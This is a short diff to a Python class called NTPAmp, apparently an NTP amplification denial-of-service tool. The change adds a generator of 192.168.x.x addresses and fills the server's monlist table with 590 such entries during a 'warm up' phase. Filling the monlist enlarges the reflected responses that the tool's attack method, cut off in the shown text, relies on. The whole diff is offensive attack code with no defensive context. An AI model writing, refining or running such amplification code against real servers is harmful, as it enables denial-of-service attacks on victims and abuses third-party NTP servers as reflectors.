@@ -44,6 +44,12 @@ class NTPAmp(object):
             entries = map(lambda e: (e[0], int(e[1])), entries)
             self.ntpservs = entries
 
+    def generate_randomip(self):
+        ip="192.168.{}.{}"
+        for o3 in range(2, 255):
+            for o4 in range(2, 255):
+                yield ip.format(o3, o4)
+
     def add_monlist(self,srcip,sport):
         """
         Send ntp sync(ntpdate command)
@@ -83,9 +89,12 @@ class NTPAmp(object):
         :return:
         """
         self.logger.info("[+] Warm up start!")
-        target="192.168.178.{}"
-        for r in range(2, 255):
-            self.add_monlist(target.format(r), random.randint(2000, 65535))
+        # target="192.168.178.{}"
+        # for r in range(2, 255):
+        #     self.add_monlist(target.format(r), random.randint(2000, 65535))
+        gen = self.generate_randomip()
+        for i in range(590):
+            self.add_monlist(gen.next(), random.randint(2000, 65535))
 
     def attack(self):
         """
